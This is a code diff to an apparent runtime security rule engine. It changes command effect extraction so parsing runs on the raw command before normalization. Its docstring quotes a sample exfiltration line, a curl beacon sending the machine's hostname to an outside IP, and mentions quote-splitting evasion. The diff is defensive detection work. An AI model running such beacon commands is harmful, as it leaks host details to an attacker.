@@ -3267,7 +3267,7 @@ def _extract_fields(event: Dict[str, Any]) -> Dict[str, str]:
         "command": command,
         # What the command does, for rules that name `exec`/`reads`/`writes`/
         # `net_dst` in `fields:` instead of `command`. See prismor.runtime.effects.
-        **_effect_fields(command),
+        **_effect_fields(raw_command, command),
         "path": _resolve_path(raw_path),
         "url": str(event.get("url", "")),
         "combined_text": "\n".join(combined_parts),
@@ -3312,24 +3312,30 @@ def _extract_fields(event: Dict[str, Any]) -> Dict[str, str]:
 _EFFECT_FIELDS = ("exec", "reads", "writes", "net_dst")
 
 
-def _effect_fields(command: str) -> Dict[str, str]:
+def _effect_fields(raw_command: str, command: str) -> Dict[str, str]:
     """The command's effect facets as matchable fields.
 
     Fail closed: when the extractor cannot read the command with confidence
-    it returns None, and every facet then IS the raw command -- a rule that
-    asked for `writes` matches exactly what it matched before. A confident
-    parse that finds no writes yields "", which the field loop skips, and
-    that skip is the whole precision gain.
+    it returns None, and every facet then IS the normalized command -- a rule
+    that asked for `writes` matches exactly what `command` matches. A
+    confident parse that finds no writes yields "", which the field loop
+    skips, and that skip is the whole precision gain.
+
+    The parse runs on the RAW command. Normalization rewrites `$(hostname)`
+    to ` hostname`, which erased the very substitution the extractor treats
+    as doubt: `curl http://<ip>/beacon?h=$(hostname)` read as a confident
+    parse with no destination. The executed text is normalized afterwards,
+    so quote-splitting evasion still meets the patterns written against it.
     """
     if not command:
         return {name: "" for name in _EFFECT_FIELDS}
     from prismor.runtime.effects import extract
 
-    effects = extract(command)
+    effects = extract(raw_command or command)
     if effects is None:
         return {name: command for name in _EFFECT_FIELDS}
     return {
-        "exec": effects.exec,
+        "exec": _normalize_command(effects.exec) if effects.exec else "",
         "reads": "\n".join(effects.reads),
         "writes": "\n".join(effects.writes),
         "net_dst": "\n".join(effects.net_dst),
